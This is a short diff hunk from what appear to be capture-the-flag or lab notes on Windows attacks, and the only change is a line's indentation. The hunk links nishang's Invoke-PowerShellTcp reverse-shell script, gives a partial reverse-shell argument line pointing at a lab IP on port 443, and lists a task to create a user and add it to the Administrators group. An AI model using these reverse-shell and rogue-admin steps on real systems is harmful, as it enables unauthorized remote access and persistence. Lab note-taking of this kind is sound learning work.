@@ -316,7 +316,7 @@
 			
 		--> Invoke-PowerShellTcp  :
 			-->  https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
-10.10.38.232 443 -e
+		10.10.38.232 443 -e
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> task 8:
 		--> 建立一個新使用者並將其新增至「管理員」群組
